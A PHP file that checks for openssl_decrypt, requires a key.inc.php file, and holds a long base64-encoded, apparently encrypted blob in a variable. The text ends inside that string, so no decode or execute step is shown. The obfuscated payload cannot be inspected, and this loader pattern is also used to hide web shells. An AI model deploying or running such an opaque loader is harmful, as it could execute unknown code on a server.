<?php
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists('key.inc.php')){include_once('key.inc.php');}else{die('<h2>File key.inc.php not found !</h2>');}
$e7091="VllLZCtrYmswUjRFRXBXVTl2ci9JQzBlaG1ZU3BCYUV5U0hiSzRnY3N0eGcyREJmbFV6L2s2cjR4SmdEbmtCNGF4RElkeGxkNFM1SThHT3liUWZhVlpObnVnTVFtWVFPcVBoaDNqT3k4QkRBYmlIVW5UZ0EvazZkUXMzeXR0WTlud2J0K1BjQzhFOGo5eHZiOWV6YnV2RUNJNERMR0h3VkhqdW03SVZGT0NLZ2N5ZXhLOUFpUFR2M0VIMmVLQ3J5YTROK3lFeGNPeWwwZmt4MWNTU01BQlczbTFsZHhyazJSay8wOGNQeGVTeDBjbjBaME5SKzJyaHJ3WnpwbUpEZXhONUE1Q0hGZjVkUGlaVENkNjFvWm5vb1B4enhKSG1tWnVxTDRuQUxqby9wTzJaeUcrNFZtaDBxa3NnWm13SHFLeHNITDcrblBRNzRMZVRWZmxWaWFKY3M5eW16QzcyQ0ROZXluN25lZFBWUXVaU05uZ2JQS0M0Z0NOZlBIR01OUjhiQUFsOTVscENtaysvRkRNWS9sYUhUcitrRFVOTWxrQk01bWo1MUw0NFUvWVlpQVg4SGI0bmN0WmNtelFSczJYZzRFazVjbC9UWTJBdjNuR3pHRm5tSUxIL3dJMDB3eTFrWTl4aWJyeUR4T29PeDFzZVJ3OGhVS1pNYUlUR1BUUlZlMmdkYTUzYVE0bFU0VVYxbE9iek1UTzh5eEhBRVBCeGlkODR2TzFMNW00aXlRMTFmVWZ2TDZaakhJTnRPOTJ0Z05DL0l3Z1JQWjFzTWsrWjB1VmEwbHFYbmZWU1J1dFJqT3g3ZVArWHBnRG96VEJaWERyYnVMbURyakRudnZ1VFZOVGVFM3BONVV4cFFpaUxsWHJFc0ZjRk5CM2xTNGhReWR0MzZFUFdwVWFZMU5hNVhSclNWNElkVmNwSzhhZXhOUTRxNkhoOU1tWUwyRXMvYzNmbFNHNEVqR245Z0haakhEYlRHVzdtQzgvSTZnTTV0VVkzRGFxQ2lqTGg0UHpOUHBqTklHVmxTYk41c0x2SFVCc1NKTDM5RU5uY2ZLU1BuY2FYSzVoZ2VHZE11RnI0M1AxK21ET0VsL3oyRGtRVk9OMi9GWVMwLzBPdndDVkJBSjNrU0p5emdWVzdVZlRYNjRwaVJOQW1PMDRLTzBtRHFWd3o1YjZ5VnlsUjRNMFJuNHJkbVg2eVZQQ1V1MW5GWnJxSVJHTk5mNGZUcXV1bk1aaHpKSWxzVWRrbFZrazYzVTJ4bHRWUG1NOG9SYzNCSEJ4WFFxS2xLS2RScjNTMmdac1NkMmkvYXMvTU5uVEMrMWg1bHdTbHhyNGh2RTRIREluYXBzMlpiWjRlMFRrMVBsTVEwbFU5OGIwMXVTaDYrUFo0MDhMRHRvanVBT08xMXpXTzFDeDFoRlJuSTJuWkZvc2ZEaUNPdFQ0eWQzeko2bkRobEJDSHU4bHRQK2lTTVg5dmFYbHJwM3pMQ2ZNMmlwVzVoa1N1VEZiek13ZWFaQ2hvYXRTNlMvZFArVGVyV0cvcytiejVWYnlqQXBpS2c1eTlYYkU0aXJuaGRTZGtuQkRBZXpodjNRbGw0RS8rRDJwQmdpZ0NvT2Z0QVlXdkpKYlVjdm51VlZkMnh4V3FuYzU0WElYR2c4WFdCdjNUK2hiKzkwQkthNWdNSkhCWFBtb1YwQjFPc25CRFdOK0FkdEUwdmoxQWRoVEFEcmlTS2ZvdFpneXcvbXAyajAyeEdjT0dhYVM5c2NDZTVsWmJEc0k0UUt4MlUwcmppKzBBVnhDTmxUK2grN3Y1VDgwUTNTZGhYSTc2MHgxaFRqMzVML2dhekxZVXFPWlVsaGtRSE02RzNEakJhRzNWVWYyZE9ITXQxeTRnVUZWdFc1RFdienkwNkhaNldCZ0tDRHdVV3V1eXZ3b0lKVnZSWXJWc1ltbVFnbXZ4TXBZOG5ZeXc5bFd3QnBLQzhLdldmUTFHWDFBamRSL3p6ZEhIREtTYVNpdnkzbHlqdkZmZW15RUJoMVdiTnhyN0ZqQjBhNTZwV2oyL0owMm9jNnlqOEMvSDlUNEc4aThvOU01aDdCVFh0ZjA3VVZ4SXo4ZVFmYUQrQ0c0dmpGbTFHeThMdWVLeFRRbkcrdW9zbWZJTHZJckxqK1JmQ0VKNlJzYzcxRGl1Z2NITC9xaHlGZThoQ0JJRlJKMnp3UHl0RHJZOE1vbHJqTkt1a0pQNysxY09URWFSazk3SkpSZDY2dVlENWJhR0lRQnpWQ091VlE0MHl5b09vazFVb1BOem9Ec2J1RGtsak95NjZWNlArWTYxYytuNDJlV0VvK01ZdVlQSlV4YVJYYnF0UEp0azhUMTBZVXQ3N0s3NTUvU0xpR2h5Q2ZtalUwalJQcUNiS25JT0d3OGVKemg1M3UxYyt4Qi8zTExVOG4zWE5DQ1UzTVVoZ0o3KzRwQ2dPVjYzVzdJOGxqaUgxZVZwZXJEUjVybUVJS3Q0TmpFcUlRNmRXQzRVd2p0a1hyNmdvUXM1VmM1RFc4Uzg3RXlsY013NjdrQml3R0c4cmZtY2Vrb0thdXJQaUZ2K2dHekxGV3RJOEFMQVYrdVlNUzZNMFc2ZVRJMkdHNWVzTFZlUmdqc2d5MHpWTjBEOTZaZWVnRjZNS1dUS1hJenlFRUpPVFh1MnRrbFBudmhsTGdvejZxb3dZc0VvaUR1bUVZT3hOUlJjSUp0RGNyQ2RkbHlTdmM5TGlBUjlGQjI4RUZWdXd0aHpiR091RWlQRWV6TTNnam9HbVQ4NHJFQlNBWDdZWHhuVWdVWVVJMkJSYjVaWUtpZHBYQWNJRDkyZlVzS0owN1J6TkhjWHJFSnNPS2ZUZUtrYWMyMmFoRzJEV0JDVGhoTzZMRVh6QnB2d3pNdncwVlorVzV3OVpQd2Y4anRZSTBNQ3RUNlFwTHZGa2FnUTNpUmR6Y3hTL0oyUDQwM0RYaS8wb1ozUGhHMi8zVUFqMUl1Y3FBMFBhRUVVRjVodGN5RUNnYzFVM2RnMnJSR0x0c1FvdHlZbERoY3R0L2cyODc0bjk3cHRJOUVoSVVIeUlMYzNRcU9hWUhtdjYveGJ4NUNDOTBFU0lUTlhQeUlrbWMveXNPWFFrMjlFTU9LU3g1QUpLZ295RVB3ZzVmaHZPa1JkQ2JGOExMeTVYR2g0Skl4NkxMVW5McWVIK05INVhPbTd6b291L1RlZnFSOGFkN05rb1JLNmJlay9aOThMWGM4MW8xVG8va2lla0tnNEl1RnptYzIrRmhvLzNMNVNlVGswV0FUZlNxbmhLVjlRcE9XTDM2TWxxcXh2MEptZy8wVDhMQjBBeHVHR1R5OFhoamtzV0JmUzhQUEdJbFd6NVp1akE2bG9mT01qUUtGRWJyWVNJM1Q1aFFBejJqbFZxby9DeUpQT2E5OFl3Um1HcU9jeHd3K0E3d3NtNGFxa05JU0VCMDZsQ0VJci8yZWtQSnhBdXV1Z0NzOFN4R0lmTVRqNlIxQUlsN3VFM3FLMDN5RWw0cCtVN0hKK3dTUnM2MkVabmYxbGNDNkFJTnB5eGd6VU9sMzRnUENYTzEwNUNqU284TGhDenFiQ1VuU2ttOTN3OVpBemlrSjUxUG9oU0tSMG9QTEtSRGdLUWpoaHQwdzZ3Mll2SkhsUGFuSUwxSWdnWXdXOVdwZjRybi9ZRXRqZjBlbExiaVRiVGlVSVlpWUdsL0o4V2g4SFBxSWd5L3JXRHNwSEQvYm4yTzVJUXN3VWRmN3p4TjZMeUYrbUJ0cFQxdWJ5c0hLdmMvWjJNcW12MWJNUEx6b2NXeTFBblQ4bmhIaXZvbjMrUm9iMHVsVTlaMC8ybnVQa3JraDRjeHYxdlpnZHZaUGNuMXRLNWVraGQyNjNQRHh3ekh0b3dYbU85Uy94RFdKUW55dFZKcThqYis0d0tMVXlJTlZwS2h2bVpuZzVsTy9ZYkJTakw0M3JUSzV2KzlXME5QTGc3ZVJxWVg4R2p2b1BYZlYxWTBQTGdvNVh6dEwrNDUrSkhVeWNyY3l3QVJLWG94cDRzRG1HUTVLMUdnTEoxM3Y2Ujc5Y2VVODdPZVlZS0NNNUVxRTlZc2toZUE0MlVKbjNzVUQxVDg1SDlucTVpQVQzbG5rcElZcjkvaThqVTI5WTZ5TnRkTTJ5c3JMcnJBTEE4RFp0UG1TS3lIL3BNa0RhbjU3NHlrdnI0VXdXU2FPcElKZnNGTDRURm9WazZLVndNOVQycENiaVJ0SDY4bEtzYUxnT2g4NkU1RmtMY1cxUTdScTU5U2l6R0N6ekV4QVdqZ2NOeVVLY0Y2UCtKSDg5cnY5TVdtU2M4a3o1UzlTdGROd2hieUV3SEtwZTdqR05Db1gyMXlWMFZhZVJtTFdjaEM5S0M4dmtvc1BCSUQvRzFBZnphaUo2ZE43bGhzWXBna1QzZzZBZlV2TkpuMXVRR3NTT2toTjN6eXNjQjNHd0hEV1p4WjRaZ1FleXBsa0l0SnB4Y1FnVXdUdVdzS3RRUTFvSk0xREN4bjhHSkFHMk82VWxTamQ2U1RqQ1NaU041U2txUmIvUVBkYkVWMTJIMUJCbDIyTy8vRk1KU0Q3dDQxVXJZaVJZQzFNOFpvdWc0bTYwOHNkUVlNYWNvbEl6MkhmZFFEUnJDWDdaY25tY3VuZU1pa3Q3Zm15SXB3ZHIxdThDa3hFVXBKa2NJOEMwQ1M2WXlqNHRad0VueWlMdjAvalFwczczaDVRdHNVNzg0S01xNzQwclgvUGNrVVROSk9mSit2RGhybmhTR1hLYjl1ekFzbk5FK3JLbXI5WEVzT3BqYU9oZExVZk43Tiszb1FxZVlSaU5DRU0yZUpEVnlxQWQ1NEFxSjM2Z3dtci9BUnFxckI5LzhRdHladjRQQ3NENTNKZ2hXZG9PZEpERGttcXUrbFdnWFhuZmtyQ29mZDBsRVBHLzdaZjJmZGcydGoxUzdrdFZVSENoa1U0MUt4bVBaZWFsTUxBdXErNUFaVDU1aHlheEptNmxjdjBBOGVIMExYeGw5K1ZYMk0yVWF2SklXSkp6N0VYNXRNdXdwR0NxVDRma3BoVDVOSzJQRjZnZTAwNGx1VFVSSUovS29yOXpBZ0FoTldCWlZCRnhIRTY4TkRIenE3ZW40b1lQQng1RVFOV1ViMURXbzFpRS83MVZxOWlCWG9EV1d6VFl0V2lobnVJWkM5SlVZbUlOTDZJWUZ3VlB5Q245cytXc0VEK0JzMUE5Vy9haWxseUVaUzRxeFFnSmdiU21qZVpuYzc5d1ZGaEx0azU1Uk1sVFBtRkhEdDZrYUZ1QnlPZDZGQnY3Ri9ncDhxWEhPNmhwR1hKNVJDOWxMRy9yZDdXVXFjWnUzWkl2aG5aeHZUdW1UZ050S0lhNEFnemtSYlh2RE9SSDUxWUxuVTBseWpSdDRleldNcnNxNUtzVHRaaVBhL0QvbHpoM3I5U2Y1akVEOTJXbjdYWjZoYW43RFBNeHVkdTdURW81NXJCeXZsTWV2NU9rWVNpclVrWFRDYTFUc1h1TkJkM3FaYmFOZjFMT2RTNG9FMmphUURuTDkvN09CdWY1d2xMRjZSS3N3TVpUdktmZlh1VnVLN0ZpdGloK1RJUUFVWmNSUU5mTzlkaE43R3puOGpGeWJsZmdYaUMvb2pVMG5DSG5wd0dZQWlIYXhCNCs5K0NMRmhwWE9kY0dOWDFGMzA1cmRKQXJkZmlLSllRVDViUXFKOW5LMWFjSk81ZlhESlRwbDR2ZllvQ3pRM0ZGM0RPQ1J3MTYvNG9pRDBxaXNqbkpBWXY2SlFwNmJpV1ZMczBwSlFkbTVrS3RVdkJKMHNhdFBFN2JxZ2JmSEFKNGM5dFMyTVk2NElHT3F6N3FFV3lKRGRoVVd0VVhDMVV4RWxyRDMyUXY4eVdDRFg5NjF1amFvNzlPaWpHTm5hM0Y2S0RIbktxV2l5YVUwa3U2UFA2ckJYZS9jMGEzR01qSEVZcnROVS8vZ3B4R2xwZm5hdHlkNWg1TUhZdEZlYXZlZHRwWHJXbDBudkdSQlA2ME1wc2tFWUY3c1cvc3FzVVAwZE03TjdLRlNOSGtraElwYmtCdDQvRDZzZ24yMnplTFowUWFBMzUvUURMWVZkTHRJeklmS3VKemt3ZHBYV2NUV28ramNjN2F4eGhGeWltaVVNZnI3d0VZSTZTUjdiWTJ5Nm5SemFyWUMrR2hVSmEwdmF2YjZBSXVzbUcxUlhkMlh4eWNSUlVxN1drREJhcGsrcGJrZjhocHRtOGNtT1Y5QWdkalMrcnhCam5qUldrVXRTVzBEWndzbURTMlhEa3hqSEg0M1JHVDVzS2JRUDVzZ1VERVhUdXBhY1M3RzNLQ3NiK0ZrQWlEMkp3UWJPWHZGWG9WbGZvNWVkUTlmbXF1ZEo4M2pVOUhDZkZXMlU4d0dWZjVJa0tCaEVRL3BmZUlPdTRXSXk1eWRmeS9iZ05aU3FWcWdNNEhiY1dEWVlmZzIrV0ZCZk5DQ29ra25NZFlIQStlclhadGhmRmdtZ3JBeVlBS29KSjlwVGlzUlk2c1luYy82SlVKR0FvdFZ2Y1k3Y3FSaWZzZzdsa1FyNTBRRGF1RlBIbWJ5cmlLeG5SOFVrMHFYdmFYVVl3YWZOa3lwWHN0UFBobGlmdlFpVXh2d1l0TzI0ajhwcWZMb0RCZFdHdTY0WWZRcmJHMERIZ2U4T1VNNkVmK0ZId2svcVBqdjdVNWFsbSt2dEtmOXIvRHRzQkhTNXBjNis0Z0V2SktmUzAxRVZhM1pzRGVZR2MxakVibU9hdFNuZURaek5aSVJWNkg3UVV6Q1d1MFJwV29ZV0FSSzJwRkZueXFJRkpGV2ZBam9Ma0JOTmtCNlNHOEhtbW5RWVlWN3NtazgzaGlHQVJCTXZQbWpwOURoR1ZKRkZMRnJHckpZZnE4RXRvdG1tMU9ZdmRkZkV6VXBnTjAvMEVwMEpnNjIrc3VSUmN3Sm1IbWszQnFhWHZ4YkEvbUxBcC8wNUNzdjhHRGRWUng2a0thaVBpTTFzTExtckE1Q0d1djJCY1hmYWhqVzlrZVU4WGsycng3V2psQUhML0pXOExFeXp0cjVjOFJKVWhFamRxTjA0MUsxRHpTajVId29RVkpkVDZoVC9tMFlnNlR0VjNMMyt0N0lNaVZMSGNiVVNpYW5xZE8ySk8wVWd5elJBVGtOeTYzSHlHc0tVdVEweXI3L3Y5S0hhMmpUd09PL01ITEQ5cVJueExOb0k1QTg1ek9scXpickVyMks3Y1U1TVhEMTJ2dysxaExiNDBDS2tIdzh1VXJNbmc2ZFNLNlV2SWFlTVlUQ2hheDdTWDZ0QXlWQnlMK3NRTk1SKy9JdzJPMDh6OGx1R3E1ZVNWUGZwZzNLM2hwRlAvMGk2aUlKOUx5KzJ4RTZVK0ZVSnl0dkRUU0dmTVd0YjFpZFNNN1hxTEJCMGhhMDZDTjYrTmJGRDA3MElCSDVsaXVJZDRzZDhuYWVyZEd0LzJKcG0yL3IyalZQRmpkVnNDWVVLcU1sVjhpcWJzZ1MwdVRtNDh2RE8rdHUvenptMlVoTDl3TzRoTENmOGxyNnhFcHFNV1hqeDdOZHFYQzNJMmRqaXAyUjUvTlNVNFFJNVE0Q0I4TWlXZTM0T1FvUktUelAvQ0pTSUlXK053MnJQbytGdzJkTk5ITEpvbHA2WGtieEhibXBiTnh1ckNZcHU5bnpPeCtLMHhGeTFrTmlQWHRVY2tqMDdQc2ZPcUFxMk9lbHExaDRlVnlWM2FGVjdrV1REaU9jL2tZUmF1b1ZudFllMXRoK2ZjMlcvWG9KQTQ1NERpWDgwblhXcHZVY0V0R0pYZHpTUVZFaGYwV2UzcEx4bk4zYWlHL29XZnB1WW4xT2V6bDk2b1FCbjZUTWxNRDR5Tzcyc29QblllcWh3YkxtK3BJNGdhMnVsdW95YTM2c0t3b0YzdHJ1dHdRbmRTU0FmOEFSb2kxa2llREFlSWJGVDNCNDlTQms4Y2Z6R0JqNmNuZWhkTDBSS05uU21vWWlQdm9obE1IWGpOdU90VytSc2QzSWZGbzdXdVNIZjRyWGtLMHNMMjMrZ3JOMzJ1b1ZzZ0xlTmdmL2ZhWFY5dU9oV0FqRXFMM3hqUENoS2lMNFBjdDB0Y0E1M2ZvekJlZlgwNk5mdzd4MFE1eHZXTUsraXVIWnBHRkVGeFVUT1pzeVR3eWx4SXB3SStieWFndFNuWjZxa1BlYTU4bnlLZEZLTnVGbE9neXcxR2h4aVRVYngybFg2ckRDQnBUVnRzSE1QUENQN2ltUG5GaE85RnlZQjdvRUh1ODZYSGJ1MzFRV0NmR0N0K3ZqQm0zUlE2WFBYRHF0SlBoSzdPOGV6bHRXOTQyL21ZQWo1Y2xva2d3dkZMNmhkTHdpNWpTRUVqQzNEODdmSjBaZ3Y1bkYrMmprWkdSRzJOVXJ0VSszZis0S2dYaWpBbVlmaERWRmlWY1doNHJVemV4MGNucTdSc1NlZ1lsamlsSFVqanFISS9SRFM4dGZUc2wyQkpVZUlkNjNkSHpWOEhqZTJrek9zRWkzM0dybXE0bHFQZGpQTEk3YlBLVUtDdDhYZUlYRkRDZ3paSnUyVGRyNWZUbTFRcjV3dllUaEpIQzM1V3l5SlpqWHd0R2ZuWFF5S09HblRkYnBOdUw1ai8xSzJFQ0Mza2dhOHVZakdWcHptWE9hL2FCNkcyYzljWTNweDZzUkFrUnhSallIY1lFeUZuR1poZTVvcTdMK3N4bCtSSGw3SDdodUR0eWU5Y3FlUDdJREJ3NHByMDhJWGxJdy9TbzlFbEoyQll1cGZueVY3K0krT3NDQkZNd0Qwc2duYmhFb0RnelMvaHQ1UTVQUVdIaHFVT1N3MXlVVHYvL1JpQ3EyMVpjV2lmRjJONGZxSEhRU1NHYTBpVmZVTlpXd1B3SnI0bTY0amRmTmtFaS9LVEVtT01Ca3hWQ2kxWTkxZzNmbnIyRmJEeUFrb1czNG92WmRia241QWw0OWRQWldmalc3d1UrVFJZNXp6NGZKZW1HNThtV1kzT3diNnREeDN5R1krSkJobG4wLy9qdE84K3hTNDZlUDVrS2lSbUpIUzYrWkFndXpkQjRXbmw2REZ6bW5VUWRzS1ZZaDQrdktObG4rcllzL0kvaHVSbXY2RE04Zm9IZldoc2dMUG5ySDk1NGJPbjd1WXBqUU02UDQ4UEJzOThFUjc3RlJmNEtIOVFjWko5QXBIdm1waVN0NGFid09vTUlRVkhsMm5JR3JKMkE0bkNBbEcxUWhOU0hPMkJoWDlyZUJJdTZYYmQzZXdNY09tWFF3b0RNTlk3eGFnamQ5VEcrQmRDZlZ1YTRZRFZHSUQrdmdMMTRhVlg3dytSaGNpNXZwQTFyQnBDUkx4YWN0NS9LVTAvdDVRdExIUjE3cG9LSUFQbUUrZDBqQmFpcmRyNGFST3RIVnNlWmQ4QUthVWc0ZHR2TXljZXRSdkhZSEt4d3J3anFLSG5GYmZ6UXJGaDBCemR6YytOOXBsR05RRXlOdTRrSVVWTVdNaXJGczRyYTFCR1pvUXFvR3FvcHcwMGN4bnVJRDRKTENneC9YeTdwVHF1VlpUSHB3NTlFeXMzSVZRZStFVk43cEkzVEtLK3N0YlFiWmcxeGZzL1k1YTFPSndSazMrZnI3RDdadU1BelUzNDhEVzIyV2pqaGFNMkhwUmw4ZnN3eVd5NGk1N3BRRmhuUWlaY3lHdlliNFRWSm9XV204VGN6bE16V2hKUnovSVAyVzE2bjBCZGxNeXBoWTNzOTZUbDJsVDNCNmpaeDQ4VGtUNWRVaVhLTXNkR3pod000ZFdZWnZtcjlJOHFieVRwTU54V2Q1VEFnajl0SXkydFc0eWZCUUgrTVg2a01sK3RqVkpyZFEwR3crbE8yMUtNLzRTYTZ0T3Z4STFJcUZ3ZmtTTUxtRVlDY2tvNlFIUWlySDdoVHFWK3ZUUkhzN1BweFBlbnBOSU96YVNyekJzTXBobXQ3U3N5bGNNS3ZSODluNllndFp3VDNHY2pBSjI0dXVCOWkzTktRaEczaGFIRGJKdGhyQlBoa2FjK1BpSTNQbDlmWkNnWCtua0VyN0NVLzBvTy9WWDVteTgybCthR0FDUm1ma0dTRmNOT1VZblJ2QmRaU2NDY3R3ZXhobmQ1ZUt5M0h3M29JdFk1SlRpUlFUa3dvQUozcUdmdUhudTVXeCs4ZzIrMWxtRHNabnpTOUJOSDVZZElZWXo5MW9pbmdnSEdOZ0pHRitUbytBUGRSRHNad0JyRTRIMnpyb1dmQ3BUZHl0aGFGdnJVRGRNUEw5NkpVbDllRld6RWRHeUhnQWJyeGs3RzI1UGNRQkFZYmNQcXhCTmtpb2lZV1lGT05VN2xNc2dFRDE5b1BJVzY1d3plMHlKeDZKZDFQQnJ0NWV3WTA1Q1NnWGtjdjQ4dzU3Y2R3TU9adHIzY2pMazF2QXRWY0ZEREoyMEpzcnhnbElqS1grSDd3amdVUnFuOU03bVl6Rno3YmRIdHpWNGEvLzNDd2FGdjNDRmNXcFppTG8vbmV0Y081YjNlWGd1N0lMajB2c1laMG1xOUxJbUxqOFBiakdRRGRNZTk3TTY4c3B3NTAyc21GRW5QcHVnc3ZFdGl2Q0R1Nm9FQld6bDVYSHY5alRFWjQzV2lSMDFpMElaMk1pOGxUZ2dNQW1hZDhsZldLVURVd0h4cGdZOWFncTB5WkE0allWTFhJeThCaGFOTUJReVBHeG4ySElPNi91SVJkdHVlcWdQMXZhVFp4NVJlaUVDTWcxdkNZUUVwRVNlSXZSazBjZTdiM3p4Z0tZTlh1UlRheWNySGpnZ05LV3JiOTRkamJ0bHZDRVRMTmhINWhNTGhSd25aSFp4azUxeENya2pCQSttQmNFdDdRSWs5b3dWL1JKYjhMS0k5SEFpamVqTkdyT1RDM0xycFY3SS83UitUU1pVZUVIUUM1YVR5ZlhuYmpOSG1WSld2cnNTcXk1ZDFuenRnbWZQYjhrd1BSVzRkbkZSVXVLUVVsNjYyOGhpQmptckRyclllWnJFNGZ6OG1Yd21pRUxTSUVLd25KMDZxYTdOYWpMeXZrNmhCQVV2STg3QTBVa0FZUmVhRE12WW01eGxyYW5JSGpFNG5qSXFveFFBR3grejVMQUJEampZM2JvODdwU0UwN09BaUdVVEl6bHRrTFA4UzkyYUFLZ0Vjb2tUV0ljY21Ieks0b2ViWUxsTWVUTzBibURTVXVwNkVkWGNwQVZHc1MrOU50c2l4K3BzNndIOVZVY1N0WWpjSVYrcUF6TStQcjJLWWZKOVA1bzdNK0NmTU44b0NxSlU5NlJGMVF2WldYdnJodFhEa3ZiQ1ZZcysyZjNVR3EzS29xK2JxRW9jaUhXem9JK2RjV1N5cHZsdHExK2c0M3NiVW0xWmtZbUgxQy91N3c5ZS9rZzgrb3hadUliZHM0NXlqeE9udWd4KzNwOU9yeTJvU0YwS0NjUmJjcmRodHhBVWhiazQzSVhLekk2S0oySnhFWXVBSVJCZWE1ZzVVMGtqY0RUK0g0cnlZZlRUWU1OTGFkeDJzNTVyazhnZ0tnSWZ6SXY3RzdCdkFqZGp2bHY4RkVSd3NnN1BvR3hIVkdoTll5WktURmdRTWJsOU12Zms2VHdiazRXZ1lGOHBBWnlxTWQ0VUFPaXNDc2VKb0VoVTRpSDN4U2FjWVQxa1ordWNBdVd6ei9zWHdIKy9oM1M0ZUlTRFhWOU56N2NQbkpyaTBiQXk1ZlpMSng3UHlTdk81OURwRzBobjNpbm5JQXZHWmo3TUtad0dRM3pWU3M3MEllc2x2Q2k5NkpJSlVmZSsveHRVS04zL2lCM0lWWDdxSmpCcDEvRXZkTGU2OHIvWjNYcjVnZk1ITmNSWVFaL3lxakt4RFhzamJ4cWtQNmRHTXFOeGR4bFhqMjBpbXEvcWZ5S2twQXp4M1ZPdUFWVzJzQkNzTHhpTUk2UjRiME03RlBqZUNoVm1wckMwaHoxVnlsckNqVFJjcUwvTnJrTkRGQTBoYTJyQnZ0VFB1Zk1NdlVwbHlXdytPVllEQUZpeERZcE1SdlMyUTBDTW1pVUY2QjUrQy9wZWRNbGQxcUUxV0M1TjFwcGdjb3hRNzl5TDhtWHErazNxSHU3d3k2WEovall4WkNzbGZBTi8rZ1RyUHhuUHV5WUdFUk1hQnZKVUtMNHZ6Y1gzcnJKV21EajdCdWFRZjNHWUlWU0x5YXp0NnhLYzZlcEkxeWRtRmxSb0haenlFbmhHelJGaUdnV2lUQ3dyQTN4R2oySEw2YWYvWWlWNHc2c01MQTVlN0U3WndOcjRXRnBIYjlaTGFacFh2bzBWSnk2dVhWSDV4VVJ5Qituc0V6Ly9lamtQdzJveG40eHpJcHk4TkdPOXBJci9lUDBJYWIyZ3lzMzd2VUlZaXFzZlhKWXZqejZkU05WcXgva1VqT3J0dDVaZll4M1lrSDM4UllLOGxrRFBvNXZta09sblJMK3FYMHorenRjZ2EvTjF6QVpvZnJNb2YyQWkydHQzYlNZTE1TdGxCYXd5bVdNcUdQSlVUOXRpemJGeTJiTEdRYWpEMXlQSjZKekt6dXFYU1F0MkhlanJiYXlrNlQzbmZNTXJ0OFFwTFMyZGNKNG40L3BVL3lQSzlhNEhYR0I3MVJLczloZ0hKTkxHMjBHK1pBOEZWMm1IeW56WXIyY3lRMUJMRWpJdXFPQ1VpS01Lc2RWZzFWdlJpS1k5dkZZTDV4NlY3Qmx3U2M1NkFYUHA5T2kwQXAxVkkxNlZFZ2RYWkNheGlMUDFDK0JLVGtqMXNnTlQrUTF2T0ZqOStoMjNlb0ErUmFEQnRCM0FhaTY1Z1ljY3RTVFZYU3JqWlVnV3M4WmxwSWlUNUxHMXVxOU9SM0tPSWJIN2d4eDhTaWJ2dlMrR3lVRkNFaEZjZStWQ29qcG9lZGZkS1UxWXhWVy9uRXNneExRd2VpcElyYnVXK0JsWmp6eTZDWWo5bFlVclBvZlhycVV0S3FnczJ0azVOWHY4Skx3akYvYitUK1hhVVpIZ2ZBc2R5MFVZeDZtbTEyOG9nN3oydkxQeGprZ3hqbzI2UXlvVFR2ek1hRXBTbHlTc1k4dW5RbVlLejFOTlREZmlUZ3g5allMaExIYUlOOVhGVVozRVRzeUp0OE9VejNRems2bmFlMzVNRVZuMnlFNzFVMTJtYUhXSDM3N2xiZSs1NStyNVZvU2VNL3lxRlJnekdsNTBUaVBiRDYyRlRQeWFvRnB2Zkx1K1d0dlRyY3pCNG1nWlpuTE4yT1d3TjJOczBoSlpjTCtTQjhFTmx1a2Z1V2g0UGs0MHJQdUJsZGlSM1UzZldaMnpjOXZqNGpNTkJqQXd2WEJxN3E1S0Q1NFNrNUxNOTFuUGFVTXF1djlIRlR3ZHhyL1FXQUlZcjZLWW5tQUZGdm9OM3VCVys5anpnVHd4TjZBazhjdmFPNGxqTmpNUDZCTHNCdWo5NW1rWjF4TXdUS0tRQUVreEpnN1h4R2RPNkxnc0JqQmtHZzlmRzNVVmNLT25Xdk9GcHZORGxuVitRc3MralRJeEVQTkU2V000ZEhoNy9vTmlvZkRZbUFwQVI5WHBQS2JNM3FiK1RDZkdaUW9LZDA5aU4xYWZ2NW91STlSb0U1alRQa1l6ZSszT3VESWxGTDVDRUo3NkF1R2hCSVRPYjNCclNyR1hqZ1JrZkkxbEJNWEpxbC9oRTZyMUYzanlYcDVZT3FsOWhZaTNLZFhQT1dQZ3NMQXFreHIvUXg3S1lDNFpKRktFUW9EN1RtbWorR0o4SDZwVEs2TWYvb3k2bEZqMkdGWEV2dGkwR2JMSFZZV2xzRUM3MEU3Ym4vQ21oR3FMR01XdkFod3VDcFVEQnRWN2g0Ry84emZlNm1SOWFLSy92emw4ejhmWlptTzdBT2JpSjNJeDBPcDNGdFRiNDA2V3F4TytDRnBLZmxTRDB4SnRaMUVGa21obEkzU1hCRGUxNUFiVERWREl4UVVucDMxZm8yVGRVVkhtYkk2SldMMy9vWFNsSTJHWGh3aU1UbFZyMlhvaHZKdVlsUGRXT3RYTTFCUjRWck5HSVlZZENiSkRvVVVYS1NCMGVCaitXL21vY2xRdytjZWVJNE0yaU5lenM3Q2pReGZEdm13V1RuMGxxbkN0Z0diN0lWUGY3ZXVLWStWR3AxUXhKRGtlbVBWQTNXRXJqdFVWZ2s5MXI5OXBybjlGZWtNUGxSTE8rM24vYlZqeit5RjZzVnNOdGdDdlVEOXpEVnFWaXhiSzkvV1l1NTgya2lBNGVmc29YQlBZU3Q1dUJjelJFR1F3cCtHUy80YWJJV3BIWEY1L1FLZW5jZUQ0SGdmS1lBMmdsQlQ5cFR6UVpPek9vajc3eVZxZTBGbTVld01YUnJEV0c1ejIwMW9ocmtnNEJyMThURmhuTUV6RlRWMWlXVE80UmloWTk2ejhaYTNIMFYxbkdIVmJDSEJMSWxQQXlQOTJBTW04OTEydDdscVFqd2RiVTZ6d3A5OVVhSXRBVWtTRGphVm9COW9kUGtMVkFCZ2FtZnJRTHdzRDlzOC9NREVCNE4vdEx4NFFhRmlvWmN6ZFl3d0RHMEtWOFNQVEdmblZ1YUNjdm9qNlNsVkF2Q0tyaFh4VC96bWJhS1d5U01VbHNCbnJpWGVPTmx4WVJkRTAvVE1SaktkdlhpSnhlN0hHWS9aSUc1Z2ZkeEl2L1ZjM0pJTVd5ZnUzVkh2OEVVV0VscEZDa1praWk1Mkx0QWZuN1BhcVYwaGtuWTJDS0ZrOHNHc3I1a3dwTTVodTJ1YWR5N01PYnRSa21Ua1diampSTW5kcm1VOEp4QU9vZjlQZ3R1ek5nNldTZCtuYzNMVXRUS2dpL0p1dlEzd3lOaXpuUzZsMHFTdDl6c2NmcmxKbVoxYkFZak8xZFR5dk43NVNCeDdoK0pvVS8vSTNsWnF2dGxzL2RCV2Q0SFg0ZjgzN2JIYzJsbnVIaHdJU001UVJpZURjdU9oMERNK2dOenhpak4rTUJEUU5KT2psaG9FV0hKeUsyRDAzZnRqbDlCWFRYVEdFdVhhK2w2NHZtdkFJakpya0pxeTBwVGtzL1JyTnM2SXlCVXZYZGZGV1A1QW1qYmVkeFFMVHVFaDV